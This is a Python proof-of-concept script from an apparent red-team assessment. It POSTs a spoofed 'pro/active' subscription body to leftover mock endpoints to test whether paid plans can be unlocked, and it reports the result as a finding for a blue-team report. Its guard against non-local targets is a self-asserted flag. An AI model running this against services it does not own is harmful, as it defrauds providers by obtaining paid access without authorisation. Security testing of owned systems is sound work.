#!/usr/bin/env python3
"""S4 — RED PoC: abuse /api/subscription/mock-set if present on an OWNED target.

Educational anti-tamper assessment. Refuses non-local targets unless
--i-own-this is asserted. Output is a finding dict for the blue-team report.
"""
from __future__ import annotations
import argparse, json, sys
from urllib import request, error

MOCK_PATHS = ("/api/subscription/mock-set", "/api/subscription/mock")
SPOOF_BODY = '{"plan":"pro","status":"active"}'


def _is_local(url: str) -> bool:
    low = url.lower()
    return any(h in low for h in ("127.0.0.1", "localhost", "0.0.0.0", "[::1]"))


def probe(target_url: str, *, i_own_this: bool, timeout: float = 5.0) -> dict:
    base = target_url.rstrip("/")
    finding = {"id": "S4", "vector": "mock-endpoint subscription abuse",
               "severity": "high", "confirmed": False,
               "evidence": "", "target": base, "remediation": "D5"}
    if not _is_local(base) and not i_own_this:
        finding["evidence"] = ("refused: non-local target requires --i-own-this "
                               "(owned/lab only per ethics guardrail)")
        return finding
    for path in MOCK_PATHS:
        url = base + path
        req = request.Request(url, data=SPOOF_BODY.encode(),
                              method="POST",
                              headers={"Content-Type": "application/json"})
        try:
            with request.urlopen(req, timeout=timeout) as r:
                body = r.read(512).decode("latin1", "replace")
                finding["confirmed"] = True
                finding["evidence"] = f"{url} -> HTTP {r.status}: {body}"
                return finding
        except error.HTTPError as e:
            if e.code in (404, 405):
                continue  # endpoint not present — try next
            finding["evidence"] = f"{url} -> HTTP {e.code}"
            return finding
        except (error.URLError, TimeoutError, OSError) as e:
            finding["evidence"] = f"{url} -> connect error: {e!r}"
            return finding
    finding["evidence"] = "no mock subscription endpoint responded (likely not present)"
    return finding


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="S4 RED PoC (owned/lab target only)")
    ap.add_argument("target", help="base URL, e.g. http://127.0.0.1:8080")
    ap.add_argument("--i-own-this", action="store_true",
                    help="assert target is owned/intentionally vulnerable")
    ap.add_argument("--timeout", type=float, default=5.0)
    args = ap.parse_args(argv)
    print(json.dumps(probe(args.target, i_own_this=args.i_own_this,
                           timeout=args.timeout), indent=2, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    sys.exit(main())
